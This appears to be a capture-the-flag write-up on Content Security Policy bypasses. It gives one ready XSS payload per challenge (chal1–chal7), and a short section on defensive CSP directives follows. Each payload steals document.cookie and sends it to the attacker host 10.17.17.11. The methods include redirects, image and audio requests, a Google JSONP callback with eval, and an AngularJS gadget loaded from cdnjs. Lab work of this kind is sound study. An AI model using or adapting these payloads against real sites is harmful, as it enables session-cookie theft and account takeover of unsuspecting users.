# payloads
chal1 is pretty straightforward, chal2 allows loading of resources from unsafe sources, chal3 allows loading images form unsafe sources, chal4 requires a matching nonce attribute.

```text-plain
chal1: <script>document.location='http://10.17.17.11/?cookie='+document.cookie</script>


chal2: <script src="api/images/8QSTj0ThetVy/${document.cookie}`)"></script>

chal3: <script>(new Image()).src = `http://10.17.17.11/${encodeURIComponent(document.cookie)}`</script>

chal4: <script nonce="abcdef">window.location='http://10.17.17.11/'+document.cookie</script>
```

chal5 trusts google subdomains and unsafe eval function allows cookie stealing.

```text-plain
chal5: <script src="https://accounts.google.com/o/oauth2/revoke?callback=eval((new Image()).src = `http://10.17.17.11/${encodeURIComponent(document.cookie)}`)"></script>

		<script src="//accounts.google.com/o/oauth2/revoke?callback=eval(document.location='http://10.17.17.11/'.concat(document.cookie))"></script>
```

chal6 trusts cloudflare, just finding the correct syntax( [https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass](https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass) )

```text-plain
chal6: <script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.3/prototype.min.js" integrity="sha512-C4LuwXQtQOF1iTRy3zwClYLsLgFLlG8nCV5dCxDjPcWsyFelQXzi3efHRjptsOzbHwwnXC3ZU+sWUh1gmxaTBA==" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.min.js"></script>
<div ng-app ng-csp>

{{$on.curry.call().document.location='http://10.17.17.11/' + $on.curry.call().document.cookie}}

</div>
```

chal7 allows xss from its error pages `/` and using audio function we can exfill the cookie

```text-plain
chal7: <script src="/'; new Audio('http://10.17.17.11/' + document.cookie); '"></script>
```

Defend:
-------

first, defend chal is pretty simple, just limiting scripts to our website `script-src ‘self’;`

In second, we have to use a nonce value(aparantly others don't work and you have to use helmet, not figuring out how to now tho) `script-src ‘nonce-ae3b00’;`

for third, we need a sha256 hash of the inline js(view source and between script tags `console.log("__defend-3_REAL=true"))`

use [https://report-uri.com/home/hash](https://report-uri.com/home/hash)  to generate hash and use it like so:

`script-src 'sha256-8gQ3l0jVGr5ZXaOeym+1jciekP8wsfNgpZImdHthDRo=';`